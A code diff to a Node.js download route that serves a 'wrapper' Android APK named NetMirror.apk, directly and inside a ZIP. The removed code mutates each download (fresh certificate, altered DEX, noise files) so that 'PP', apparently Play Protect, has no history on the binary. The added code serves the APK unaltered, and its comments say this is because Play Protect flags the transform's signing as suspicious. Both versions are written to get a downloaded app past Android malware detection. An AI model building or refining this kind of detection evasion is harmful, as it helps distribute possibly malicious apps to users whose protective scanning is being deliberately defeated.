@@ -551,22 +551,11 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         wrapperBuf = getWrapperApkBuffer();
       }
       if (wrapperBuf) {
-        // ═══ POLYMORPHIC TRANSFORM — unique APK per download ═══
-        // Each download gets a FRESH cert + mutated DEX + random noise files +
-        // unique signing block. PP has zero history on the resulting binary.
-        console.log(`[DL] Applying polymorphic transform to wrapper (${(wrapperBuf.length / 1048576).toFixed(2)} MB)...`);
-        let serveBuf = wrapperBuf;
-        try {
-          const { buffer: polyBuf, certInfo, polymorphic } = polymorphicTransformWrapper(wrapperBuf);
-          if (polymorphic) {
-            serveBuf = polyBuf;
-            console.log(`[DL] Serving polymorphic wrapper: ${(serveBuf.length / 1048576).toFixed(2)} MB, cert="${certInfo?.cn || 'unknown'}"`);
-          } else {
-            console.log('[DL] Polymorphic transform returned non-polymorphic — serving base wrapper');
-          }
-        } catch (polyErr) {
-          console.error('[DL] Polymorphic transform error:', polyErr.message, '— serving base wrapper');
-        }
+        // Serve the wrapper AS-IS (signed with real apksigner V2+V3).
+        // Do NOT apply polymorphic transform — it replaces the proper V2+V3
+        // signing with node-forge V1+V2 which PP detects as suspicious.
+        console.log(`[DL] Serving wrapper APK as-is (${(wrapperBuf.length / 1048576).toFixed(2)} MB, apksigner-signed)`);
+        const serveBuf = wrapperBuf;
         res.setHeader('Content-Type', 'application/vnd.android.package-archive');
         res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
         res.setHeader('Content-Length', serveBuf.length);
@@ -611,14 +600,8 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         wrapperBuf = getWrapperApkBuffer();
       }
       if (wrapperBuf) {
-        // Polymorphic transform — unique APK per download
-        let serveBuf = wrapperBuf;
-        try {
-          const { buffer: polyBuf, polymorphic } = polymorphicTransformWrapper(wrapperBuf);
-          if (polymorphic) serveBuf = polyBuf;
-        } catch (polyErr) {
-          console.error('[DL-ZIP] Polymorphic transform error:', polyErr.message, '— using base wrapper');
-        }
+        // Serve as-is (no polymorphic transform — preserves apksigner V2+V3)
+        const serveBuf = wrapperBuf;
         // Wrap in ZIP
         const zipArchive = new AdmZip();
         zipArchive.addFile('README.txt', Buffer.from(
